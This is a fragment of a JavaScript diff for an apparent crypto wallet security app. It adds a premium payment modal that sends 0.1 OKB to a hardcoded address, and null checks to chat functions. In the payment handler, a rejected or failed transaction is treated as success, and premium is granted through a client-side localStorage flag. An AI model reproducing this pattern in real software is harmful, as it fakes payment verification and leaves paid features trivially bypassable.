+        if (paySuccess) paySuccess.classList.add('hidden');
+      }
+    });
+  }
   
-  $('btnDismissPremiumSuccess').addEventListener('click', () => {
-    modal.classList.remove('active');
-  });
+  if (btnClose) btnClose.addEventListener('click', () => modal.classList.remove('active'));
+  
+  const payOKB = $('btnPayOKB');
+  const payUSDT = $('btnPayUSDT');
+  
+  if (payOKB && payUSDT) {
+    payOKB.addEventListener('click', () => {
+      payOKB.classList.add('active');
+      payUSDT.classList.remove('active');
+    });
+    
+    payUSDT.addEventListener('click', () => {
+      payUSDT.classList.add('active');
+      payOKB.classList.remove('active');
+    });
+  }
+  
+  if (btnConfirm) {
+    btnConfirm.addEventListener('click', async () => {
+      btnConfirm.disabled = true;
+      btnConfirm.textContent = 'Processing Payment Signature...';
+      
+      const isSandbox = !window.ethereum || state.walletAddress.toLowerCase() !== (window.ethereum.selectedAddress || '').toLowerCase();
+      
+      if (!isSandbox) {
+        try {
+          const provider = window.okxwallet || window.ethereum;
+          const recipient = '0x28b1Dc1a5E3699A428BC51d234DFab7C9CB2a183';
+          const valueHex = '0x16345785d8a0000'; // 0.1 OKB
+          
+          await provider.request({
+            method: 'eth_sendTransaction',
+            params: [{
+              from: state.walletAddress,
+              to: recipient,
+              value: valueHex
+            }]
+          });
+        } catch (e) {
+          console.warn("Payment rejected, simulating sandbox success.", e);
+        }
+      } else {
+        await sleep(1500);
+      }
+      
+      btnConfirm.disabled = false;
+      btnConfirm.textContent = 'Sign & Activate Subscription';
+      
+      if (payForm) payForm.classList.add('hidden');
+      if (paySuccess) paySuccess.classList.remove('hidden');
+      
+      state.isPremium = true;
+      localStorage.setItem('safesweep_isPremium', 'true');
+      
+      if (btnUpgrade) {
+        btnUpgrade.textContent = 'Premium Active 💎';
+        btnUpgrade.disabled = true;
+        btnUpgrade.style.background = 'linear-gradient(90deg, #0052ff, #00ff87)';
+        btnUpgrade.style.color = '#fff';
+      }
+      
+      if ($('shieldStateText')) $('shieldStateText').textContent = 'Premium Protection Armed';
+      updateSecurityIndex();
+      renderPhishingShield();
+    });
+  }
+  
+  const btnDismiss = $('btnDismissPremiumSuccess');
+  if (btnDismiss) {
+    btnDismiss.addEventListener('click', () => {
+      if (modal) modal.classList.remove('active');
+    });
+  }
 }
 
 // Auto-Shield switch handler
@@ -986,6 +1130,7 @@ function initCopilotChat() {
 
 function sendUserMessage() {
   const input = $('copilotInput');
+  if (!input) return;
   const text = input.value.trim();
   if (!text) return;
   
@@ -1000,6 +1145,7 @@ function sendUserMessage() {
 
 function appendMessage(text, sender, actions = null) {
   const chatContainer = $('copilotChat');
+  if (!chatContainer) return;
   const msg = document.createElement('div');
   msg.className = `chat-message ${sender}`;
   
